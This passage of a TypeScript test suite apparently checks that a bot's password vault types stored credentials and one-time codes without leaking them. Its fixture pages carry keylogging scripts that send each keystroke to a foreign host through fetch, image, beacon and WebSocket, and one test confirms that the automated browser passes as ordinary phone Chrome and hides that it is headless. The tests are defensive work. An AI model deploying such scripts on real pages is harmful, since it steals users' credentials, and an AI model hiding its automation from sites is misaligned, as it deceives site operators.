      assert.include(text, `${"v".repeat(130)}-end`);
    }).pipe(Effect.scoped),
  );

  it.live("a secret goes only into the field of the page it was checked on", () =>
    Effect.gen(function* () {
      if (chromium === undefined) return;
      const partner = yield* serve({
        "/": page(
          "Partner",
          `<input type="password" id="p" autofocus>
        <script>
          document.getElementById('p').addEventListener('input', (event) =>
            fetch('/got?' + encodeURIComponent(event.target.value)));
        </script>`,
        ),
        "/got": "",
      });
      const home = yield* serve({
        "/": page(
          "Home",
          `<input type="password" placeholder="Secret" onfocus="location.href='${partner.origin}/'; const t = Date.now(); while (Date.now() - t < 600) {}">`,
        ),
      });
      const browsers = yield* chromiumProfile;
      const pin: Pin = { site: home.site, origins: [partner.site] };
      const { text } = yield* browsers.act("profile", pin, {
        action: "open",
        url: `${home.origin}/`,
      });
      const ref = /\[(e\d+) textbox "Secret"/.exec(text)?.[1];
      assert.isDefined(ref, text);
      yield* Effect.flip(
        browsers.act("profile", pin, {
          action: "type",
          ref: ref!,
          text: "hunter2-secret",
          submit: false,
          secret: { site: home.site, kind: "password" },
        }),
      ).pipe(Effect.ignore);
      yield* browsers.act("profile", pin, { action: "snapshot" });
      assert.notInclude(partner.hits.join(" "), "hunter2");
    }).pipe(Effect.scoped),
  );

  it.live(
    "a typed secret reaches no host off the pin, and nothing is typed while the sheet is open",
    () =>
      Effect.gen(function* () {
        if (chromium === undefined) return;
        const foreign = yield* serve({ "/": page("Foreign") }, "127.0.0.2");
        const home = yield* serve({
          "/": page(
            "Home",
            `<input type="password" placeholder="Secret">
        <script>
          document.querySelector('input').addEventListener('input', (event) => {
            const value = encodeURIComponent(event.target.value);
            fetch('${foreign.origin}/fetch?' + value).catch(() => {});
            new Image().src = '${foreign.origin}/img?' + value;
            navigator.sendBeacon('${foreign.origin}/beacon', value);
            try { new WebSocket('ws://127.0.0.2:${foreign.port}/ws?' + value); } catch {}
            setTimeout(() => fetch('/done'), 1500);
          });
        </script>`,
          ),
          "/done": "",
        });
        const browsers = yield* chromiumProfile;
        const pin: Pin = { site: home.site, origins: [] };
        const { text } = yield* browsers.act("profile", pin, {
          action: "open",
          url: `${home.origin}/`,
        });
        const ref = /\[(e\d+) textbox "Secret"/.exec(text)?.[1];
        assert.isDefined(ref, text);
        const typeSecret: PageAction = {
          action: "type",
          ref: ref!,
          text: "hunter2-pinned",
          submit: false,
          secret: { site: home.site, kind: "password" },
        };
        yield* browsers.act("profile", pin, typeSecret);
        yield* Effect.promise(() => home.requested("/done"));
        assert.deepEqual(received(foreign), nothing);

        yield* browsers.openSheet("profile", `${home.origin}/`);
        const refused = yield* Effect.flip(browsers.act("profile", pin, typeSecret));
        assert.match(refused.message, /sign-in sheet open/);
        yield* browsers.closeSheet("profile");
      }).pipe(Effect.scoped),
  );

  it.live("a field inside a frame, even one on an allowed site, never gets a secret", () =>
    Effect.gen(function* () {
      if (chromium === undefined) return;
      // The frame names its own field like a vault ref; refs resolve in the top document only.
      const partner = yield* serve({
        "/": page(
          "Partner",
          `<input type="password" data-vault-ref="e9" autofocus>
        <script>
          document.querySelector('input').addEventListener('input', (event) =>
            fetch('/got?' + encodeURIComponent(event.target.value)));
        </script>`,
        ),
        "/got": "",
      });
      const home = yield* serve({
        "/": page(
          "Home",
          `<input type="password" placeholder="Secret"><iframe src="${partner.origin}/"></iframe>`,
        ),
      });
      const browsers = yield* chromiumProfile;
      const pin: Pin = { site: home.site, origins: [partner.site] };
      const { text } = yield* browsers.act("profile", pin, {
        action: "open",
        url: `${home.origin}/`,
      });
      yield* Effect.promise(() => partner.requested("/"));
      assert.notInclude(text, "e9");
      const refused = yield* Effect.flip(
        browsers.act("profile", pin, {
          action: "type",
          ref: "e9",
          text: "hunter2-framed",
          submit: false,
          secret: { site: home.site, kind: "password" },
        }),
      );
      assert.match(refused.message, /No field e9/);
      yield* browsers.act("profile", pin, { action: "snapshot" });
      assert.notInclude(partner.hits.join(" "), "hunter2");
    }).pipe(Effect.scoped),
  );

  /** A login site with a name, password and SMS-code step; its pages try to send every value away. */
  const loginSite = (leakOrigin: string, expected: { user: string; pass: string; code: string }) =>
    Effect.acquireRelease(
      Effect.promise(async () => {
        const posted: string[] = [];
        const leak = `<script>for (const el of document.querySelectorAll('input')) el.addEventListener('input', () => {
        const v = encodeURIComponent(el.value);
        new Image().src = '${leakOrigin}/img?' + v;
        fetch('${leakOrigin}/fetch?' + v).catch(() => {});
      });</script>`;
        const html = (title: string, body: string) =>
          `<!doctype html><title>${title}</title><body><h1>${title}</h1>${body}${leak}</body>`;
        const login = (note = "") =>
          html(
            "Sign in",
            `${note}<form action="/session" method="post"><input name="user" type="email" autocomplete="username" placeholder="Email"><input name="pass" type="password" autocomplete="current-password" placeholder="Password"><button>Sign in</button></form>`,
          );
        const server = NodeHttp.createServer((request, response) => {
          let body = "";
          request.on("data", (chunk) => (body += chunk));
          request.on("end", () => {
            const form = new URLSearchParams(body);
            const send = (status: number, page: string, headers: Record<string, string> = {}) => {
              response.writeHead(status, { "content-type": "text/html", ...headers });
              response.end(page);
            };
            if (request.method === "POST") posted.push(request.url ?? "");
            if (request.url === "/session" && request.method === "POST")
              return form.get("user") === expected.user && form.get("pass") === expected.pass
                ? send(302, "", { location: "/code" })
                : send(200, login("<p>Wrong email or password.</p>"));
            if (request.url === "/code")
              return send(
                200,
                html(
                  "Confirm sign-in",
                  `<p>We sent a code to your phone.</p><form action="/verify" method="post"><input name="otp" inputmode="numeric" maxlength="6" placeholder="Code"><button>Verify</button></form>`,
                ),
              );
            if (request.url === "/verify" && request.method === "POST")
              return form.get("otp") === expected.code
                ? send(302, "", { location: "/home", "set-cookie": "session=1; path=/" })
                : send(200, html("Confirm sign-in", "<p>Wrong code.</p>"));
            if (request.url === "/home")
              return /session=1/.test(request.headers.cookie ?? "")
                ? send(200, html("Account", `<p>Signed in as ${expected.user}</p>`))
                : send(302, "", { location: "/login" });
            return send(200, login());
          });
        });
        await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
        const { port } = server.address() as NodeNet.AddressInfo;
        return { server, posted, origin: `http://127.0.0.1:${port}`, site: `127.0.0.1:${port}` };
      }),
      ({ server }) =>
        Effect.promise(() => {
          server.closeAllConnections();
          return new Promise<void>((resolve) => server.close(() => resolve()));
        }),
    );

  it.live(
    "a bot signs in with a kept name and password and a one-time code, and no value comes back",
    () =>
      Effect.gen(function* () {
        if (chromium === undefined) return;
        const values = { user: "kept-user@example.org", pass: "Kept-Pass-4471!", code: "551188" };
        const wrong = "Wrong-Pass-9";
        const leakHost = yield* serve({ "/": page("Leak") }, "127.0.0.2");
        const site = yield* loginSite(leakHost.origin, values);
        const fs = yield* FileSystem.FileSystem;
        const stateDir = yield* fs.makeTempDirectoryScoped({ prefix: "vault-signin-" });
        const store = yield* VaultStore.make(stateDir);
        const browsers = yield* chromiumBrowsers();
        yield* Effect.addFinalizer(() => browsers.close(profileOf(site.site)));
        const unreachable = new Proxy({}, { get: () => () => Effect.die("not used") });
        const vault = makeVault({
          store,
          flows: yield* makeFlows,
          gmail: unreachable as Gmail,
          oauth: unreachable as OAuthClient,
          slack: unreachable as Slack,
          browsers,
        });
        const act = (action: PageAction, secret?: string) =>
          vault.act({
            site: site.site,
            action,
            actor: "Shopper",
            writes: true,
            signIn: true,
            ...(secret === undefined ? {} : { secret: { id: secret, name: secret } }),
          });
        const ref = (text: string, label: string) => {
          const found = new RegExp(`\\[(e\\d+) textbox "${label}"`).exec(text)?.[1];
          assert.isDefined(found, text);
          return found!;
        };
        // The user's cards, as BotSecrets forwards them.
        yield* vault.loginSet({
          id: "shop-login",
          site: site.site,
          kind: "username",
          value: values.user,
        });
        yield* vault.loginSet({
          id: "shop-password",
          site: site.site,
          kind: "password",
          value: values.pass,
        });

        const results = [];
        const typeLogin = (passwordId: string) =>
          Effect.gen(function* () {
            const login = yield* act({ action: "open", url: `${site.origin}/login` });
            results.push(login);
            results.push(
              yield* act(
                { action: "type", ref: ref(login.snapshot, "Email"), text: "", submit: false },
                "shop-login",
              ),
            );
            const after = yield* act(
              { action: "type", ref: ref(login.snapshot, "Password"), text: "", submit: true },
              passwordId,
            );
            results.push(after);
            return { login, after };
          });
        // A refused password leaves the sign-in form: not signed in, and marked for a new card.
        yield* vault.loginSet({
          id: "shop-wrong",
          site: site.site,
          kind: "password",
          value: wrong,
        });
        const refused = yield* typeLogin("shop-wrong");
        assert.match(refused.after.snapshot, /Wrong email or password/);
        assert.isTrue((yield* vault.loginFailed("shop-wrong")).failed);
        assert.isNull(store.account(site.site)?.signedInAt);

        const { login, after: codeStep } = yield* typeLogin("shop-password");
        assert.match(codeStep.snapshot, /Confirm sign-in/);
        assert.isFalse((yield* vault.loginFailed("shop-password")).failed);
        assert.isNull(store.account(site.site)?.signedInAt);
        const retry = yield* Effect.flip(
          act(
            { action: "type", ref: ref(login.snapshot, "Password"), text: "", submit: true },
            "shop-password",
          ),
        );
        assert.match(retry.message, /call request_login/);

        yield* vault.loginSet({
          id: "shop-code",
          site: site.site,
          kind: "code",
          value: values.code,
        });
        const home = yield* act(
          { action: "type", ref: ref(codeStep.snapshot, "Code"), text: "", submit: true },
          "shop-code",
        );
        results.push(home);
        assert.match(home.snapshot, /Signed in as \[secret shop-login\]/);
        const again = yield* Effect.flip(
          act({ action: "type", ref: "e1", text: "", submit: false }, "shop-code"),
        );
        assert.match(again.message, /is gone/);
        assert.deepEqual(site.posted, ["/session", "/session", "/verify"]);
        assert.isNotNull(store.account(site.site)?.signedInAt);

        const audit = yield* fs.readFileString(`${stateDir}/audit.jsonl`);
        const seen = [
          JSON.stringify(results),
          audit,
          retry.message,
          again.message,
          leakHost.hits.join(" "),
        ].join("\n");
        for (const value of [...Object.values(values), wrong]) {
          assert.notInclude(seen, value);
          assert.notInclude(seen, encodeURIComponent(value));
        }
        assert.deepEqual(received(leakHost), nothing);
      }).pipe(Effect.scoped, Effect.provide(Layer.merge(NodeServices.layer, NodeCrypto.layer))),
  );

  const jpegDataUrlSize = (dataUrl: string) =>
    jpegSize(Buffer.from(dataUrl.split(",")[1] ?? "", "base64"));

  const sizedPage = page(
    "x",
    `<meta name="viewport" content="width=device-width">
  <script>
    const size = () => { document.title = innerWidth + 'x' + innerHeight + '@' + devicePixelRatio; };
    size(); addEventListener('resize', size);
  </script>
  ${"<p>The quick brown fox jumps over the lazy dog.</p>".repeat(40)}`,
  ).replace("<title>x</title>", "");

  it.live(
    "the sheet and bot pages run at a device scale of 1, the sheet at its client's size",
    () =>
      Effect.gen(function* () {
        if (chromium === undefined) return;
        const home = yield* serve({ "/": sizedPage });
        const browsers = yield* chromiumProfile;
        yield* browsers.openSheet("profile", `${home.origin}/`);
        yield* browsers.viewport("profile", { width: 300, height: 500 });
        // Polled until the page rests, so the sharp screenshot that follows the screencast is among them.
        const widths = new Set<number>();
        let seq = 0;
        let last: { width: number; height: number } | undefined;
        for (let tries = 0; tries < 40; tries++) {
          const frame = yield* browsers.frame("profile", seq);
          seq = frame.seq;
          last = frame;
          const size = frame.image === null ? undefined : jpegDataUrlSize(frame.image);
          if (size !== undefined) widths.add(size.width);
          else if (widths.has(300)) break;
        }
        assert.deepEqual([last?.width, last?.height], [300, 500]);
        // A sharp screenshot at a device scale of 3 would be 900 wide.
        assert.isTrue(
          widths.has(300) && [...widths].every((width) => width <= 390),
          [...widths].join(),
        );
        yield* browsers.openSheet("profile", `${home.origin}/`);
        yield* browsers.closeSheet("profile");
        const { title } = yield* browsers.act(
          "profile",
          { site: home.site, origins: [] },
          { action: "open", url: `${home.origin}/` },
        );
        assert.equal(title, "390x844@1");
      }).pipe(Effect.scoped),
  );

  it.live("a sheet tap is followed by the page's focus after it, on a text field and off it", () =>
    Effect.gen(function* () {
      if (chromium === undefined) return;
      const at = (top: number) =>
        `position:absolute;box-sizing:border-box;left:20px;top:${top}px;width:300px;height:40px`;
      const home = yield* serve({
        "/": page(
          "Fields",
          `<input type="password" style="${at(200)}"><button style="${at(400)}">Next</button>
        <script>requestAnimationFrame(() => requestAnimationFrame(() => fetch('/ready')))</script>`,
        ),
      });
      const browsers = yield* chromiumProfile;
      yield* browsers.openSheet("profile", `${home.origin}/`);
      yield* Effect.promise(() => home.requested("/ready"));
      let seq = 0;
      const focusAfter = (tap: number) =>
        Effect.gen(function* () {
          for (let tries = 0; tries < 40; tries++) {
            const frame = yield* browsers.frame("profile", seq);
            seq = frame.seq;
            if (frame.focus?.tap === tap) return frame.focus;
          }
          return assert.fail(`no focus read after tap ${tap}`);
        });
      yield* browsers.input("profile", { type: "tap", x: 100, y: 220, id: 1 });
      assert.deepEqual(yield* focusAfter(1), {
        editing: true,
        fields: [{ x: 20, y: 200, width: 300, height: 40 }],
        tap: 1,
      });
      yield* browsers.input("profile", { type: "tap", x: 100, y: 420, id: 2 });
      assert.include(yield* focusAfter(2), { editing: false, tap: 2 });
    }).pipe(Effect.scoped),
  );

  it.live(
    "every frame says the size of its own picture, also when a resize leaves a page at rest",
    () =>
      Effect.gen(function* () {
        if (chromium === undefined) return;
        // A static page sends no screencast frame after a resize, so the old picture stays the newest.
        const home = yield* serve({ "/": sizedPage });
        const browsers = yield* chromiumProfile;
        yield* browsers.openSheet("profile", `${home.origin}/`);
        let seq = 0;
        const seen: Array<{ reported: number; picture: number; width: number }> = [];
        const poll = (until: (width: number) => boolean) =>
          Effect.gen(function* () {
            for (let tries = 0; tries < 30; tries++) {
              const frame = yield* browsers.frame("profile", seq);
              seq = frame.seq;
              const size = frame.image === null ? undefined : jpegDataUrlSize(frame.image);
              if (size === undefined) continue;
              seen.push({
                reported: frame.width / frame.height,
                picture: size.width / size.height,
                width: frame.width,
              });
              if (until(frame.width)) return;
            }
          });
        yield* poll((width) => width === 390);
        yield* browsers.viewport("profile", { width: 300, height: 500 });
        yield* poll((width) => width === 300);
        assert.isTrue(
          seen.some((frame) => frame.width === 300),
          "no frame at the new size",
        );
        for (const frame of seen) assert.closeTo(frame.reported, frame.picture, 0.01);
      }).pipe(Effect.scoped),
  );

  /**
   * A page whose button (y 79 to 179, under the heading) opens the next window. It holds a socket
   * the test can watch end, and reports once painted, so a tap does not land before the page can be hit.
   */
  const windowPage = (n: number, title: string) =>
    page(
      title,
      `<button style="display:block;width:390px;height:100px" onclick="window.open('/window?n=${n + 1}')">Open</button>
    <script>
      new WebSocket('ws://' + location.host + '/hold?n=${n}');
      requestAnimationFrame(() => requestAnimationFrame(() => fetch('/ready?n=${n}')));
    </script>`,
    );

  const windowSheet = (
    pages: Record<string, string> = {
      "/": windowPage(0, "Home"),
      "/window?n=1": windowPage(1, "One"),
      "/window?n=2": windowPage(2, "Two"),
      "/window?n=3": windowPage(3, "Three"),
    },
  ) =>
    Effect.gen(function* () {
      const home = yield* serve(pages);
      const browsers = yield* chromiumProfile;
      yield* browsers.openSheet("profile", `${home.origin}/`);
      let seq = 0;
      const until = (path: string, popup: boolean) =>
        Effect.gen(function* () {
          for (let tries = 0; tries < 40; tries++) {
            const frame = yield* browsers.frame("profile", seq);
            seq = frame.seq;
            if (frame.url?.endsWith(path) && frame.popup === popup && frame.height === 844)
              return frame;
          }
          return assert.fail(`the sheet never showed ${path}`);
        });
      const tapOn = (n: number) =>
        Effect.gen(function* () {
          yield* Effect.promise(() =>
            Promise.all([home.requested(`/ready?n=${n}`), home.requested(`/hold?n=${n}`)]),
          );
          yield* browsers.input("profile", { type: "tap", x: 100, y: 130 });
        });
      const tap = browsers.input("profile", { type: "tap", x: 100, y: 130 });
      return { home, browsers, until, tapOn, tap };
    });

  it.live("a window the page opens shows on the sheet; closing it brings the page back", () =>
    Effect.gen(function* () {
      if (chromium === undefined) return;
      const { home, browsers, until, tapOn } = yield* windowSheet();
      yield* until("/", false);
      yield* tapOn(0);
      const one = yield* until("/window?n=1", true);
      assert.deepEqual([one.width, one.height], [390, 844]);
      // A socket the page never got to open cannot be seen closing.
      yield* Effect.promise(() => home.requested("/hold?n=1"));
      yield* browsers.input("profile", { type: "closePopup" });
      yield* until("/", false);
      yield* Effect.promise(() => home.socketClosed("/hold?n=1"));
    }).pipe(Effect.scoped),
  );

  it.live("a page keeps two windows at most, and closing the sheet closes them", () =>
    Effect.gen(function* () {
      if (chromium === undefined) return;
      const { home, browsers, until, tapOn } = yield* windowSheet();
      yield* until("/", false);
      yield* tapOn(0);
      yield* until("/window?n=1", true);
      yield* tapOn(1);
      yield* until("/window?n=2", true);
      yield* tapOn(2);
      yield* until("/window?n=3", true);
      yield* Effect.promise(() => home.socketClosed("/hold?n=1"));
      yield* Effect.promise(() => home.requested("/hold?n=3"));
      yield* browsers.closeSheet("profile");
      yield* Effect.promise(() =>
        Promise.all([home.socketClosed("/hold?n=2"), home.socketClosed("/hold?n=3")]),
      );
      assert.isFalse(browsers.sheetOpen("profile"));
    }).pipe(Effect.scoped),
  );

  const reopenPages = () => {
    const closing = (k: number) =>
      page(
        `Window ${k}`,
        `<button style="display:block;width:390px;height:100px" onclick="window.close()">Close</button>
      <script>requestAnimationFrame(() => requestAnimationFrame(() => fetch('/ready?g=${k}')));</script>`,
      );
    return {
      "/": page(
        "Home",
        `<button style="display:block;width:390px;height:100px" onclick="window.open('/gone?k=' + (window.k = (window.k || 0) + 1))">Open</button>
      <script>requestAnimationFrame(() => requestAnimationFrame(() => fetch('/ready?n=0')));</script>`,
      ),
      ...Object.fromEntries([1, 2, 3, 4].map((k) => [`/gone?k=${k}`, closing(k)])),
    };
  };

  it.live(
    "a window opens again on the sheet after an earlier one closed itself or was closed",
    () =>
      Effect.gen(function* () {
        if (chromium === undefined) return;
        const { home, browsers, until, tap } = yield* windowSheet(reopenPages());
        const ready = (id: string) => Effect.promise(() => home.requested(`/ready?${id}`));
        yield* until("/", false);
        yield* ready("n=0");
        for (const k of [1, 2]) {
          yield* tap;
          yield* until(`/gone?k=${k}`, true);
          yield* ready(`g=${k}`);
          yield* tap;
          yield* until("/", false);
        }
        yield* tap;
        yield* until("/gone?k=3", true);
        yield* browsers.input("profile", { type: "closePopup" });
        yield* until("/", false);
        yield* tap;
        yield* until("/gone?k=4", true);
        yield* ready("g=4");
        yield* tap;
        yield* until("/", false);
      }).pipe(Effect.scoped),
  );

  it.live("the vault browser presents itself as a plain phone Chrome, headless nowhere", () =>
    Effect.gen(function* () {
      if (chromium === undefined) return;
      const headers: Record<string, string | string[] | undefined> = {};
      const home = yield* serve({
        "/": page(
          "Probe",
          `<pre id="out"></pre>
        <script>
          (async () => {
            const high = await navigator.userAgentData.getHighEntropyValues(['fullVersionList', 'platformVersion', 'model', 'formFactors']);
            await fetch('/seen');
            document.getElementById('out').textContent = JSON.stringify({
              ua: navigator.userAgent,
              brands: navigator.userAgentData.brands.map((b) => b.brand),
              full: high.fullVersionList.map((b) => b.brand),
              mobile: navigator.userAgentData.mobile,
              platform: navigator.platform,
              chrome: typeof window.chrome,
              webdriver: navigator.webdriver,
              touch: navigator.maxTouchPoints,
              memory: navigator.deviceMemory,
              cores: navigator.hardwareConcurrency,
              languages: navigator.languages,
              formFactors: high.formFactors,
            });
          })();
        </script>`,
        ),
        "/seen": "",
      });
      home.server.on("request", (request) => {
        if (request.url === "/seen") Object.assign(headers, request.headers);
      });
      const browsers = yield* chromiumProfile;
      const pin: Pin = { site: home.site, origins: [] };
      yield* browsers.act("profile", pin, { action: "open", url: `${home.origin}/` });
      yield* Effect.promise(() => home.requested("/seen"));
      const { text } = yield* browsers.act("profile", pin, { action: "snapshot" });
      const seen = JSON.parse(text.split("\n").find((line) => line.startsWith("{")) ?? "{}") as {
        brands: string[];
        full: string[];
        [key: string]: unknown;
      };
      assert.notMatch(`${text}${JSON.stringify(headers)}`, /headless/i);
      assert.include(seen.brands, "Google Chrome");
      assert.include(seen.full, "Google Chrome");
      assert.match(String(seen.ua), /Android 14; Pixel 8\) .* Chrome\/\d+\.0\.0\.0 Mobile Safari/);
      assert.include(
        {
          mobile: seen.mobile,
          platform: seen.platform,
          chrome: seen.chrome,
          webdriver: seen.webdriver,
        },
        { mobile: true, platform: "Linux armv8l", chrome: "object", webdriver: false },
      );
      assert.deepEqual([seen.languages, seen.formFactors], [["en-US", "en"], ["Mobile"]]);
      assert.deepEqual([seen.memory, seen.cores, seen.touch], [8, 8, 5]);
      assert.match(String(headers["sec-ch-ua"]), /"Google Chrome";v="\d+"/);
      assert.equal(headers["sec-ch-ua-mobile"], "?1");
      assert.equal(headers["sec-ch-ua-platform"], '"Android"');
      assert.equal(headers["accept-language"], "en-US,en;q=0.9");
    }).pipe(Effect.scoped),
  );

  it.live("a leased profile is restored before its browser starts and saved after it exits", () =>
    Effect.gen(function* () {
      if (chromium === undefined) return;
      const events: string[] = [];
      let saved = () => {};
      const savedOnce = new Promise<void>((resolve) => {
        saved = resolve;
      });
      let restoreFails = true;
      const lease = {
        restore: async (profile: string) => {
          if (restoreFails) throw new Error("host down");
          events.push(`restore ${profile}`);
        },
        save: async (profile: string) => {
          events.push(`save ${profile}`);
          saved();
        },
        discard: async () => {},
      };
      const home = yield* serve({ "/": page("Home") });
      const browsers = yield* chromiumBrowsers({ lease });
      const pin: Pin = { site: home.site, origins: [] };
      // A profile that could not be restored never starts a browser, so an empty one is never saved.
      const failed = yield* browsers
        .act("profile", pin, { action: "open", url: `${home.origin}/` })
        .pipe(Effect.flip);
      assert.match(failed.message, /host down/);
      restoreFails = false;
      yield* browsers.act("profile", pin, { action: "open", url: `${home.origin}/` });
      assert.deepEqual(events, ["restore profile"]);
      yield* browsers.close("profile");
      yield* Effect.promise(() => savedOnce);
      assert.deepEqual(events, ["restore profile", "save profile"]);
    }).pipe(Effect.scoped),
  );
});
